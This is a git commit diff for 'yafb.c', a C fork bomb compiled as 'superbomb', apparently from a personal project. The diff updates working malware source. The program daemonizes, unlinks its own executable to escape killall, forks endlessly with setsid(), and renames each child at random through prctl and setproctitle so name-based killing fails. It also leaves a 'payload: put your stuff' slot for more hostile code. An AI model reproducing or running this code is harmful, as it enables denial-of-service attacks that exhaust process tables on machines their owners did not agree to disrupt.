4023444a5fd4ecac27176f1c74080fe2432ca638
gh0stwizard <vitaliy.tokarev@gmail.com>
2016-04-16 17:19:34 +0300

    use setsid() as docs says

--- yafb.c
+++ yafb.c
@@ -1,29 +1,34 @@
 /*
- * 2016, gh0stwizard
- *
  *
  *                  USE ON YOUR OWN RISK!
  *
  *
- * gcc -Wall -std=gnu99 -o superbomb yafb.c
- * ./superbomb
+ * cc -Wall -Wextra -std=c89 -o superbomb yafb.c
+ * shell> ./superbomb
  */
 
-#ifdef __linux__
+#if defined(__linux__)
 #include <sys/prctl.h>
 #endif
+#if defined(BSD)
+#include <sys/types.h>
+#endif
+#include <limits.h>
 #include <unistd.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <time.h>
+#include <err.h>
 
+/* amount of forks created before the parent exited */
 #define MAXFORKS 4
 
-int main(int argc, char *argv[])
+
+int
+main (int argc, char *argv[])
 {
-        char orig[256];
-        
+        char executable[PATH_MAX];
         char temp[16];
         pid_t cpid;
         int len, nlen;
@@ -32,30 +37,49 @@ int main(int argc, char *argv[])
         char *p;
         struct timespec wtime, ptime;
 
-        len = strlen(argv[0]);
-        strncpy(orig, argv[0], len);
 
+        /* child fork sleep time */
         wtime.tv_sec = 0;
         wtime.tv_nsec = 1000000; /* 1 msec */
-        
+
+        /* payload sleep time */
         ptime.tv_sec = 0;
         ptime.tv_nsec = 50000000; /* 50 msec */
 
-        while ((cpid = fork()) == -1) sleep(1);
-        if (cpid != 0) exit(EXIT_SUCCESS); /* daemonize */
-        unlink(orig); /* killall looks for /proc/[pid]/exe */
+        while ((cpid = fork ()) == -1)
+            sleep (1);
+
+        if (cpid > 0)
+            exit (EXIT_SUCCESS); /* daemonize */
+
+        if (chdir ("/") < 0)
+            err (1, "chdir");
+
+        len = strlen (argv[0]);
+        strncpy (executable, argv[0], len);
+        unlink (executable); /* killall(1) looks for /proc/[pid]/exe */
 
         while (count--) {
-                while ((cpid = fork()) == -1) nanosleep(&wtime, NULL);
-                if (cpid) {
+                while ((cpid = fork ()) == -1)
+                    nanosleep (&wtime, NULL);
+
+                /* parent process continues cloning itself */
+                if (cpid > 0) {
                         if (count == 0)
-                                break; /* stop parent */
+                                exit (EXIT_SUCCESS); /* stop parent */
                         else
                                 continue;
                 }
-                if ((p = malloc(sizeof(char))) == NULL) exit(EXIT_FAILURE);
-                sprintf(temp, "%lx", (long unsigned int)p);
-                nlen = strlen(temp) - MAXFORKS;
+
+                setsid ();
+
+                if ((p = malloc (sizeof(char))) == NULL)
+                    exit (EXIT_FAILURE);
+
+                sprintf (temp, "%lx", (long unsigned int)p);
+                nlen = strlen (temp) - MAXFORKS;
+                free (p); /* prevent cow "hacks" */
+
                 char next[256];
                 for (i = 0, k = count; i < len; i++, k++) {
                         if (k >= nlen)
@@ -63,14 +87,24 @@ int main(int argc, char *argv[])
                         next[i] = temp[k];
                 }
                 next[i] = '\0';
-                strncpy(argv[0], next, len); /* cmdline */
-#ifdef __linux__
-                prctl(PR_SET_NAME, (unsigned long)next, 0, 0, 0); /* comm */
+
+#if defined(__linux__)
+                /* /proc/[pid]/cmdline */
+                strncpy (argv[0], next, len);
+                /* /proc/[pid]/comm */
+                prctl (PR_SET_NAME, (unsigned long)next, 0, 0, 0);
+#elif defined(__FreeBSD__)
+                setproctitle ("%s", next);
+#else
+                strncpy (argv[0], next, len); /* cmdline */
 #endif
-                /* payload */
-                nanosleep(&ptime, NULL);
-                if (count == 0)
+                /*
+                 * payload: put your stuff
+                 */
+                if (count == 0) /*pause ();*/
                         count = MAXFORKS;
+                nanosleep (&ptime, NULL);
         }
+
         return 0;
 }
